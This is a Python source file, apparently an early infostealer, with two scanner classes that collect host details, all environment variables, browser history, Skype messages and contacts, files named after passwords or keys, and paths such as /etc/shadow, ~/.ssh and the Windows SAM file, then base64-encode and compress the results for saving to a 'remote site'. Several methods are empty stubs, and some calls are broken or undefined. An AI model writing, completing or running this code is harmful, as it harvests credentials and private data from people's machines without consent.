'''
 # @ Author: Newt Tan
 # @ Create Time: 2024-09-04 11:10:07
 # @ Modified by: Newt Tan
 # @ Modified time: 2024-09-04 11:35:24
 # @ Description: define two classes to achieve two different scanning methods
 '''
import platform
import socket
import psutil
import os
import uuid
import getpass
import re
import shutil
import sqlite3
import browserhistory as bh
import base64
import zipfile
import gzip
import Skype


class SysInfoScanner:
    def __init__(self, save_location):
        self.save_location = save_location

    def os_info(self, ):

        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Release": platform.release()
                }

    def mach_proc_info(self,):

        return {
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Architecture": platform.architecture(),

        }

    def user_info(self,):

        return {
            "User": getpass.getuser()
        }
        
    def network_info(self,):

        return {
            "IP Address": socket.gethostbyname(socket.gethostbyname()),
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                    for elements in range(0,2*6,2)][::-1])
        }

    def disk_info(self,):

        disk_info = psutil.disk_partitions()

        return {
            "Disk Partitions": [{"device": d.device, "mountpoint": d.mountpoint, 
                                 "fstype": d.fstype} 
                                for d in disk_info]
        }

    def mem_info(self,):

        virtual_mem = psutil.virtual_memory()

        return {
            "Total Memory": virtual_mem.total,
            "Available Memory": virtual_mem.available
        }

    def env_info(self,):
        return {
            "Environment Variables": dict(os.environ)
        }
    
    def _encode(self, info):
        ''' encode extracted system info with base64
        
        '''
        encoded_bytes = base64.b64encode(info.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        return encoded_str

    def _compress(self, info, save_location):
        ''' compress extracted info adapting the compression level to the OS type
        
        '''
        os_type = platform.system()
        if os_type == "Windows":
            # standard compression
            compression_level = zipfile.ZIP_DEFLATED
            with zipfile.ZipFile(save_location, 'w', compression=compression_level) as zipf:
                zipf.writestr('info.zip', info)

        elif os_type == 'Linux':
            compression_level = 6  # Balanced compression
            with gzip.open(save_location, 'wb', compresslevel=compression_level) as gzfile:
                gzfile.write(info.encode("utf-8"))
                
        else:  # macOS or other systems
            compression_level = 9  # Maximum compression
            with gzip.open(save_location, 'wb', compresslevel=compression_level) as gzfile:
                gzfile.write(info.encode("utf-8"))
    
    def _system_info(self,):
        ''' the module to scan system info and export to somewhere
        
        '''
        system_info = {}
        system_info.update(self.os_info())
        system_info.update(self.mach_proc_info())
        system_info.update(self.user_info())
        system_info.update(self.network_info())
        system_info.update(self.disk_info())
        system_info.update(self.mem_info())
        system_info.update(self.env_info())

        # encode
        encoded_info = self._encode(system_info)
        # compress
        self._compress(encoded_info, self.save_location)


class SenInfoScanner:

    def __init__(self, save_location, root_path=None):
        ''' 
        :param save_location: local position or remote site
        :param root_path: the root path to start scanning
        '''
        self.save_location = save_location
        # dynamically set root path based on the operating system
        if root_path:
            self.root_path = root_path
        else:
            if platform.system() == 'Windows':
                # Start scanning from the C:\ drive on Windows
                self.root_path = 'C:\\'
            else:
                # Default to root path for Linux/macOS
                self.root_path = '/'

    def _ext_scan(self, target_ext: list):
        ''' cover potential sensitive info via file extension
        
        - financial spreadsheets (.xls, .xlsx, .csv)
        - documents (.docx, .pdf)
        - intellectual property (IP) (.pptx, .py, .js)
        - configuration files (.conf, .ini, .xml)
        '''
        sen_files = []
        for ext in target_ext:
            for root, dirs, files in os.walk(self.root_path):
                for file in files:
                    if file.endswith(ext):
                        file_path = os.path.join(root, file)
                        sen_files.append(file_path)
        
        return sen_files


    def _filename_scan(self,):
        ''' cover the filenames that can contain credentials info
        
        '''
        sen_filenames = []
        patterns = ['password', 'credentials','secret', 'key','login']
        for root, dirs, files in os.walk(self.root_path):
            for file in files:
                if any(pattern in file.lower() for pattern in patterns):
                    file_path = os.path.join(root, file)
                    sen_filenames.append(file_path)
        
        return sen_filenames

    
    def _brw_hist(self,):
        ''' get broswer history data
        
        '''
        hist_data = bh.get_browserhistory()
        return hist_data
    
    def _cache(self,):
        ''' scan for sen info in cache files
        
        '''
        cache_paths = []
        if platform.system() == "Windows":
            # common cache directories on Windows
            cache_dirs = [
                # user cache
                os.path.expanduser("~\\AppData\\Local\\Temp"),
                # system temp directory
                "C:\\Windows\\Temp",
                os.path.expanduser("~\\AppData\\Local")
            ]
        else:
            # common cache directories on Linux/macOS
            cache_dirs = [
                "/var/cache",
                "/tmp",
                os.path.expanduser('~/.cache')
            ]
    
        # scan the cache directories
        for cache_dir in cache_dirs:
            if os.path.exists(cache_dir):
                for root, dires, files in os.walk(cache_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        cache_paths.append(file_path)
        
        return cache_paths


    def _db(self, return_info: False):
        ''' cover potential db info like skype contact info
        
        '''
        db_files = []
        for root, dirs, files in os.walk(self.root_path):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.db'):
                    db_files.append(os.path.join(root, file))
        
        if return_info:
            # optional manipulation
            db_info = []
            for db_file in db_files:
                try:
                    dbreader = Skype.SkypeDB(db_file)
                    profile_list = dbreader.ExtProfile()
                    contracts_list = dbreader.ExtContracts()
                    calllog_list = dbreader.ExtCallLog()
                    message_list = dbreader.ExtMessage()
                    db_info.append(
                        {"db_file": db_file,
                        "profile": profile_list,
                        "contracts": contracts_list,
                        "calllog": calllog_list,
                        "messages": message_list
                        }
                    )
                except Exception as e:
                    db_info.append(
                        {"db_file": db_file,
                        "error": str(e)
                        }
                    )
            return db_info
        else:
            return db_files


    def _path(self,):
        sen_paths = []

        if platform.system() == "Windows":
            comm_sen_paths = [
                # Windows SAM file
                'C:\\Windows\\System32\\config\\SAM',    
                # User AppData Local folder         
                os.path.expanduser('~\\AppData\\Local'),    
                # Program Files       
                'C:\\Program Files',     
                # Program Files for 32-bit apps                          
                'C:\\Program Files (x86)',                         
                os.path.expanduser('~\\Documents'),   
            ]
        else:
            comm_sen_paths = [
                # User account details
                '/etc/passwd',         
                 # Shadow password file                            
                '/etc/shadow',         
                # SSH configuration folder                           
                os.path.expanduser('~/.ssh'),      
                # Log files                
                '/var/log',                                        
                os.path.expanduser('~/Documents'), 
            ]

        for path in comm_sen_paths:
            if os.path.exists(path):
                sen_paths.append(path)
        
        return sen_paths

    
    def _copy_files(self,):
        

    
    def _encode(self,):
        ''' encode extracted system info
        
        '''

    def _compress(self,):
        ''' compress extracted system info with Maximum compression
        
        '''



    def _sen_info(self, save_location):
        ''' the module to collect sensitive info from specific locations/files/extensions
        
        '''
        target_ext = ['.xls', '.xlsx', '.csv', '.docx', '.pdf', '.pptx', '.py', '.js', '.conf', '.ini', '.xml']
        collected_info = {
            'file_extensions': self._ext_scan(target_ext),
            'sensitive_filenames': self._filename_scan(),
            'browser_history': self._brw_hist(),
            'cache_files': self._cache(),
            'databases': self._db(),
            'sensitive_paths': self._path()
        }

        # Encode the collected information
        encoded_info = self._encode_info(str(collected_info))

        # Compress the encoded information into a .zip file
        compressed_file = self._compress_info(encoded_info, save_location)

if __name__ == "__main__":
    pass